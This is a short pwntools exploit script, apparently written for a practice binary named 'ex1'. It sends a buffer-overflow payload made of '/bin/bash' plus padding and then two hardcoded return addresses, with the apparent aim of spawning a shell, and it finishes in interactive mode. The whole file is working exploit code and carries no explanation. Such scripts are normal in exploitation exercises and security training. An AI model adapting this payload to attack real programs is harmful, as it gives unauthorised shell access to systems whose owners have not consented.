#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"


target = process("./bin/ex1")


bin_sh = b"/bin/bash\0" + b"A" * 54
argv = b"\0" * 8 + b"A" * 56

target.sendline("1")

payload = argv
payload += b"A" * 64
payload += bin_sh
payload += b"A" * 2 * 64
payload += b"A" * 16
payload += p64(0x7FFFFFE38F5C)
payload += p64(0x7ffff7ceb1c0)


target.sendline(payload)
target.interactive()
